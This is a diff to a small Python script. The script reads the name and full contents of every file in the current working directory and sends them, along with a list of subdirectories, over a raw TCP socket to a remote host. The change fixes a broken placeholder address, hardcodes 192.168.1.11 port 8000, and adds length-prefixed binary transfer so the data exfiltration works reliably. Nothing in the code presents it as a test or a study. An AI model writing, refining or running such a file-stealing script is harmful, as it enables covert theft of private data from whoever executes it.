@@ -1,36 +1,40 @@
 import os
 import socket
 import time
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 files = []
 file_data = []
 directories = []
 cwd = os.getcwd()
+
 for file in os.listdir():
-    time.sleep(5)
-    full_path = os.path.join(cwd, file) # Get full path
-    if os.path.isfile(full_path): #check if a file is a file
-        file_open = open(file, "r") # open the file
-        file_data_read = file_open.read() # read the data
-        time.sleep(2)
-        file_data.append(f"{file} : {file_data_read}") # save the file name and data
-        time.sleep(1)
-        files.append(file) # if True then append to files list
-    else: # else
-        directories.append(file) # Append to directories list
+    full_path = os.path.join(cwd, file)
+    if os.path.isfile(full_path):
+        with open(full_path, "rb") as f:
+            content = f.read()
+        files.append(file)
+        file_data.append((file, content))
+    else:
+        directories.append(file)
 
-data1 = f"files : {file_data}"
-pause = "       "
-data2 = f"directories : {directories}"
+directories_info = f"directories: {directories}".encode()
 
-def send(): # Send the data
-    s.connect((YOUR PORT HERE", 53))
-    time.sleep(5)
-    s.send(data1.encode())
-    s.send(pause.encode())
-    time.sleep(5)
-    s.send(data1.encode())
+def send():
+    s.connect(("192.168.1.11", 8000))
+    time.sleep(1)
+    
+    for name, content in file_data:
+        name_bytes = name.encode()
+        s.sendall(len(name_bytes).to_bytes(4, "big"))
+        s.sendall(name_bytes)
+        s.sendall(len(content).to_bytes(8, "big"))
+        s.sendall(content)
+        time.sleep(0.5)
+    
+    s.sendall(len(directories_info).to_bytes(4, "big"))
+    s.sendall(directories_info)
 
-time.sleep(1)
 send()
+s.close()
